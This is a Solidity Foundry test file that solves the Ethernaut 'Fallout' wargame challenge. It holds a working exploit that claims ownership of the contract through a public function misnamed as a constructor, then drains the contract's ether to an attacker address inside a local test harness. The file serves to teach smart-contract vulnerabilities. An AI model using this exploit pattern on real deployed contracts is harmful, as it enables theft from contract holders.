// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {console} from "forge-std/console.sol";
import {Fallout} from "../../src/ethernaut/02.sol";

// use this instead of forge Test for solidity 0.6.0 compatibility
interface Vm {
    function addr(uint256 privateKey) external returns (address);

    function deal(address who, uint256 newBalance) external;

    function startPrank(address caller) external;

    function stopPrank() external;
}

contract ForgeTestLite {
    address internal constant HEVM_ADDRESS = address(uint160(uint256(keccak256("hevm cheat code"))));
    Vm internal constant vm = Vm(HEVM_ADDRESS);

    function assertEq(address a, address b) internal pure {
        require(a == b, "assertEq(address,address) failed");
    }

    function assertEq(uint256 a, uint256 b) internal pure {
        require(a == b, "assertEq(uint256,uint256) failed");
    }
}

contract FalloutTest is ForgeTestLite {
    Fallout public falloutContract;

    address public attacker = vm.addr(1);
    uint256 public constant STARTING_ATTACKER_BALANCE = 1 ether;
    uint256 public constant CONTRACT_BALANCE = 0.5 ether;

    function setUp() public {
        falloutContract = new Fallout();
        console.log("Fallout contract deployed at: ", address(falloutContract));
        vm.deal(attacker, STARTING_ATTACKER_BALANCE);
        vm.deal(address(falloutContract), CONTRACT_BALANCE);
    }

    function testClaimOwnershipAndStealFunds() public {
        // Initially, owner should be address(0) since Fal1out() was never called
        // In Solidity 0.6.0, address(0) is the default value
        address initialOwner = falloutContract.owner();
        console.log("Initial owner: ", initialOwner);

        vm.startPrank(attacker);

        // The vulnerability: Fal1out() is not a constructor, it's just a public function
        // Anyone can call it to become the owner
        falloutContract.Fal1out{value: 0}();

        // Verify we are now the owner
        address newOwner = falloutContract.owner();
        console.log("New owner: ", newOwner);
        console.log("Attacker address: ", attacker);
        assertEq(newOwner, attacker);

        uint256 attackerBalanceBefore = attacker.balance;
        uint256 contractBalanceBefore = address(falloutContract).balance;
        console.log("Contract balance before: ", contractBalanceBefore);
        console.log("Attacker balance before: ", attackerBalanceBefore);

        // Steal all funds using collectAllocations()
        falloutContract.collectAllocations();

        // Verify funds were transferred
        uint256 contractBalanceAfter = address(falloutContract).balance;
        uint256 attackerBalanceAfter = attacker.balance;
        console.log("Contract balance after: ", contractBalanceAfter);
        console.log("Attacker balance after: ", attackerBalanceAfter);

        assertEq(contractBalanceAfter, 0);
        assertEq(attackerBalanceAfter, attackerBalanceBefore + contractBalanceBefore);

        vm.stopPrank();
    }
}
